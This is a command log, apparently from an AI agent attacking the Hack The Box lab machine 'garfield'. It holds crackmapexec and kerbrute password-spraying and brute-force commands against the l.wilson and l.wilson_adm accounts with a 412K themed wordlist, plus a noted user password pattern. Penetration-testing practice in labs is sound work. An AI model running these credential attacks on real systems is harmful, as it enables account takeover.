@@ -1,0 +1,31 @@
+{"ts": "2026-04-06T08:25:13.519941Z", "cwd": "/htb/machines/garfield", "cmd": "wc -l /htb/machines/garfield/exploits/liz_wordlist.txt"}
+{"ts": "2026-04-06T08:25:21.750115Z", "cwd": "/htb/machines/garfield", "cmd": "cat > /tmp/.claude_reasoning_state.json << 'EOF'\n{\"current_hypothesis\":\"l.wilson password follows j.arbuckle leet-speak pattern (Th1sD4mnC4t!@1978) with Liz Wilson themed phrases \u2014 412K candidates from gen_liz_wordlist.py\",\"ts\":\"2026-04-06T08:30:00Z\"}\nEOF"}
+{"ts": "2026-04-06T08:25:26.355986Z", "cwd": "/htb/machines/garfield", "cmd": "echo '{\"ts\":\"'$(date -u +%Y-%m-%dT%H:%M:%SZ)'\",\"action\":\"kerbrute passwordspray l.wilson + l.wilson_adm with 412K liz_wordlist.txt\",\"hypothesis\":\"l.wilson password follows j.arbuckle leet pattern with Liz-themed phrases\"}' >> logs/actions.jsonl"}
+{"ts": "2026-04-06T08:25:29.277391Z", "cwd": "/htb/machines/garfield", "cmd": "which kerbrute 2>/dev/null; which crackmapexec 2>/dev/null; which netexec 2>/dev/null; which nxc 2>/dev/null"}
+{"ts": "2026-04-06T08:25:33.374267Z", "cwd": "/htb/machines/garfield", "cmd": "printf \"l.wilson\\nl.wilson_adm\\n\" > /tmp/garfield_users.txt && crackmapexec smb 10.129.16.228 -u /tmp/garfield_users.txt -p exploits/liz_wordlist.txt --no-bruteforce 2>&1 | head -5"}
+{"ts": "2026-04-06T08:25:43.994228Z", "cwd": "/htb/machines/garfield", "cmd": "crackmapexec smb 10.129.16.228 -u l.wilson -p exploits/liz_wordlist.txt 2>&1 | head -3"}
+{"ts": "2026-04-06T08:25:52.590435Z", "cwd": "/htb/machines/garfield", "cmd": "crackmapexec smb 10.129.16.228 -u l.wilson -p exploits/liz_wordlist.txt 2>&1 | head -20"}
+{"ts": "2026-04-06T08:26:01.148463Z", "cwd": "/htb/machines/garfield", "cmd": "crackmapexec smb 10.129.16.228 -u l.wilson -p /htb/machines/garfield/exploits/liz_wordlist.txt 2>&1 | tail -20"}
+{"ts": "2026-04-06T08:26:08.685379Z", "cwd": "/htb/machines/garfield", "cmd": "crackmapexec smb 10.129.16.228 -u l.wilson -p 'TestPass123!' 2>&1"}
+{"ts": "2026-04-06T08:26:16.248454Z", "cwd": "/htb/machines/garfield", "cmd": "ping -c 2 10.129.16.228 2>&1"}
+{"ts": "2026-04-06T08:26:24.144638Z", "cwd": "/htb/machines/garfield", "cmd": "ip addr show tun0 2>&1; echo \"---\"; ip route 2>&1 | grep tun"}
+{"ts": "2026-04-06T08:38:48.008708Z", "cwd": "/htb/machines/garfield", "cmd": "ping -c 1 -W 2 10.129.17.44 2>&1"}
+{"ts": "2026-04-06T08:38:51.139989Z", "cwd": "/htb/machines/garfield", "cmd": "crackmapexec smb 10.129.17.44 -u l.wilson -p /htb/machines/garfield/exploits/liz_wordlist.txt 2>&1 | head -5"}
+{"ts": "2026-04-06T08:40:55.174112Z", "cwd": "/htb/machines/garfield", "cmd": "crackmapexec smb 10.129.17.44 -u l.wilson -p 'TestPass123!' 2>&1"}
+{"ts": "2026-04-06T08:41:02.462865Z", "cwd": "/htb/machines/garfield", "cmd": "which kerbrute 2>/dev/null || (apt list --installed 2>/dev/null | grep kerbrute); pip show kerbrute 2>/dev/null; ls /opt/kerbrute* 2>/dev/null; ls /usr/share/kerbrute* 2>/dev/null"}
+{"ts": "2026-04-06T08:41:08.615162Z", "cwd": "/htb/machines/garfield", "cmd": "wget -q https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 -O /usr/local/bin/kerbrute && chmod +x /usr/local/bin/kerbrute && kerbrute --version 2>&1"}
+{"ts": "2026-04-06T08:41:12.871094Z", "cwd": "/htb/machines/garfield", "cmd": "wget -q https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 -O /tmp/kerbrute && chmod +x /tmp/kerbrute && /tmp/kerbrute version 2>&1"}
+{"ts": "2026-04-06T08:41:18.482022Z", "cwd": "/htb/machines/garfield", "cmd": "echo '{\"hypothesis\":\"Box IP changed from 10.129.16.228 to 10.129.17.44\",\"action\":\"ping + CME test\",\"conclusion\":\"confirmed\",\"evidence\":\"10.129.17.44 responds, DC01.garfield.htb same domain. Old IP unreachable.\",\"ts\":\"2026-04-06T08:35:00Z\"}' >> /htb/machines/garfield/state/tested.jsonl"}
+{"ts": "2026-04-06T08:41:23.799792Z", "cwd": "/htb/machines/garfield", "cmd": "cat > /tmp/.claude_reasoning_state.json << 'EOF'\n{\"current_hypothesis\":\"l.wilson password follows j.arbuckle leet-speak pattern with Liz-themed phrases \u2014 spraying 412K candidates via kerbrute\",\"ts\":\"2026-04-06T08:35:00Z\"}\nEOF"}
+{"ts": "2026-04-06T08:41:27.456310Z", "cwd": "/htb/machines/garfield", "cmd": "wget -q https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 -O /tmp/kerbrute && chmod +x /tmp/kerbrute && /tmp/kerbrute version 2>&1"}
+{"ts": "2026-04-06T08:41:34.483519Z", "cwd": "/htb/machines/garfield", "cmd": "/tmp/kerbrute bruteuser -d garfield.htb --dc 10.129.17.44 /htb/machines/garfield/exploits/liz_wordlist.txt l.wilson -t 100 2>&1 | grep -v \"FAILED\\|Using\" | tail -20"}
+{"ts": "2026-04-06T08:41:35.708726Z", "cwd": "/htb/machines/garfield", "cmd": "/tmp/kerbrute bruteuser -d garfield.htb --dc 10.129.17.44 /htb/machines/garfield/exploits/liz_wordlist.txt l.wilson_adm -t 100 2>&1 | grep -v \"FAILED\\|Using\" | tail -20"}
+{"ts": "2026-04-06T08:54:17.718142Z", "cwd": "/htb/machines/garfield", "cmd": "cat /tmp/claude-1000/-htb/6aa8a8e9-fe5c-4dcc-a5dc-ef957012cb00/tasks/b31lfueoo.output 2>&1 | tail -20"}
+{"ts": "2026-04-06T08:54:18.262014Z", "cwd": "/htb/machines/garfield", "cmd": "cat /tmp/claude-1000/-htb/6aa8a8e9-fe5c-4dcc-a5dc-ef957012cb00/tasks/by1exqniz.output 2>&1 | tail -20"}
+{"ts": "2026-04-06T08:54:22.083893Z", "cwd": "/htb/machines/garfield", "cmd": "cat /tmp/claude-1000/-htb/6aa8a8e9-fe5c-4dcc-a5dc-ef957012cb00/tasks/b31lfueoo.output 2>&1; echo \"===\"; cat /tmp/claude-1000/-htb/6aa8a8e9-fe5c-4dcc-a5dc-ef957012cb00/tasks/by1exqniz.output 2>&1"}
+{"ts": "2026-04-06T08:54:26.522539Z", "cwd": "/htb/machines/garfield", "cmd": "ps aux | grep kerbrute 2>&1"}
+{"ts": "2026-04-06T08:54:32.429563Z", "cwd": "/htb/machines/garfield", "cmd": "ss -tn state established dst 10.129.17.44:88 2>/dev/null | wc -l"}
+{"ts": "2026-04-06T08:56:15.839773Z", "cwd": "/htb/machines/garfield", "cmd": "head -30 /htb/machines/garfield/exploits/liz_wordlist.txt"}
+{"ts": "2026-04-06T08:56:16.753725Z", "cwd": "/htb/machines/garfield", "cmd": "tail -30 /htb/machines/garfield/exploits/liz_wordlist.txt"}
+{"ts": "2026-04-06T08:56:17.184408Z", "cwd": "/htb/machines/garfield", "cmd": "shuf -n 30 /htb/machines/garfield/exploits/liz_wordlist.txt"}
+{"ts": "2026-04-06T08:56:29.816626Z", "cwd": "/htb/machines/garfield", "cmd": "ps aux | grep kerbrute | grep -v grep | awk '{print $2, $10, $11}'"}
